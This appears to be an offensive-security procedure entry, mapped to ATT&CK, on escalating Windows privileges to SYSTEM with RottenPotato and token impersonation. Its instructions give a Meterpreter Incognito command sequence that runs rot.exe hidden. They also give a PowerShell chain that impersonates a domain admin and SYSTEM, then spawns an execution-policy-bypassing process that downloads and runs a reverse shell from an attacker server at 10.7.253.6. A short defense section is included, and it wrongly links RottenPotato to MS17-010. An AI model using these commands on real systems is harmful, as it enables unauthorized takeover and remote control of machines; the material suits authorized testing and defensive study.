---
id: a981e948-997b-4657-9a30-b3cf617a8ebe
name: Elevating Privileges via RottenPotato and Token Impersonation
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:30.141809+00:00'
updated_at: '2023-04-10T20:37:38.194983+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Access Token Manipulation|T1134 - Access Token Manipulation]]'
sub_techniques: []
tags:
  - '[[tags/EoP - Impersonation Privileges]]'
  - '[[tags/RottenPotato (Token Impersonation)]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands: []
platforms:
  - Windows
tools:
  - '[[tools/RottenPotato]]'
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Elevating Privileges via RottenPotato and Token Impersonation

## Summary

This procedure demonstrates how to escalate privileges on a Windows system using RottenPotato to exploit DCOM/RPC mechanisms for token manipulation, combined with token impersonation techniques via Metasploit's Incognito extension or PowerShell scripts. It allows an attacker with initial low-privilege access to impersonate high-privilege accounts like NT AUTHORITY\SYSTEM, enabling further post-exploitation activities such as data access or persistence.

## Description

RottenPotato leverages vulnerabilities in Windows authentication protocols (pre-May 2018 patches) to perform token impersonation by abusing the DCOM activation process and RPC interfaces. This allows capturing and duplicating access tokens from privileged processes. The procedure can be executed in two variants: one using Metasploit's Incognito module to list and impersonate tokens after running the RottenPotato executable, and another using PowerShell's Invoke-TokenManipulation function to directly impersonate users and spawn elevated processes, often downloading additional payloads like reverse shells. This is effective on unpatched Windows 7/2008/Server 2012 systems in domain environments, bypassing standard privilege checks. Prerequisites include local execution rights and the RottenPotato binary. Success grants SYSTEM-level access, allowing unrestricted system control.

## Requirements

1. Local execution access on a vulnerable Windows system (e.g., Windows 7/2008 R2 unpatched for MS17-010 or similar token bugs).
2. RottenPotato executable (rot.exe) compiled or downloaded, placed on the target (e.g., via initial access vector).
3. Metasploit Framework installed on attacker machine with a Meterpreter session established, or PowerShell execution policy bypassed on target.
4. Knowledge of target domain users (e.g., domain admin) for impersonation.
5. Network access if downloading additional scripts (e.g., for reverse shell).

## Defense

- Apply Windows patches post-2018 (e.g., KB4103718) to mitigate RottenPotato exploits.
- Enable Protected Process Light (PPL) for critical services and monitor token creation via ETW (Event Tracing for Windows).
- Implement AppLocker or WDAC to restrict unsigned executables like rot.exe.
- Monitor for anomalous token impersonations using Sysmon Event ID 10 (ProcessAccess) and PowerShell logging (Module/ScriptBlock).
- Use least privilege: Limit local execution to standard users and audit privilege escalations.

## Objectives

1. Impersonate high-privilege tokens (e.g., SYSTEM or domain admin) to gain elevated access.
2. Spawn new processes with impersonated privileges for persistence or lateral movement.
3. Bypass security controls to access sensitive resources like admin shares or registry hives.

## Instructions

### Step 1: Prepare and Execute RottenPotato via Metasploit for Token Impersonation

**Context**: Establish a Meterpreter session and use the Incognito extension to list available tokens after triggering RottenPotato, which exploits DCOM to generate impersonatable tokens from privileged services. This step checks current privileges, loads the module, lists tokens, executes the exploit, and impersonates SYSTEM.

**Code** ([[codes/Metasploit-Incognito-Token-Impersonation-with-RottenPotato]]):

```msfconsole
getuid
getprivs
use incognito
list_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate_token "NT AUTHORITY\SYSTEM"
```

> This sequence starts by verifying current user ID and privileges with `getuid` and `getprivs`. `use incognito` loads the token manipulation extension. `list_tokens -u` enumerates user tokens available for impersonation. Navigate to the directory with rot.exe and execute it hidden (`-Hc`) to trigger the DCOM exploit, generating a SYSTEM token. Finally, `impersonate_token` switches the session context to SYSTEM, elevating privileges. Expected output includes token lists showing impersonatable accounts and confirmation of impersonation (e.g., "Successfully impersonated token").

### Step 2: Impersonate Tokens and Spawn Elevated Process via PowerShell

**Context**: Use Invoke-TokenManipulation (from PowerSploit or similar modules) to impersonate a domain admin or SYSTEM, then create a new elevated PowerShell process that downloads and executes a reverse shell script. This step assumes the function is loaded (e.g., via Import-Module) and targets processes like wininit for token access.

**Code** ([[codes/PowerShell-Token-Impersonation-with-Reverse-Shell]]):

```powershell
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\";"
```

> First, impersonate a domain admin user to gain intermediate privileges, then switch to SYSTEM for full elevation. The final command targets the wininit process (a privileged system process) to create a new PowerShell instance with bypassed execution policy, downloading and invoking a TCP reverse shell script from the attacker-controlled server. Expected output includes success messages like "Token impersonated successfully" and a new process spawning with elevated context, establishing a reverse connection if the listener is active.
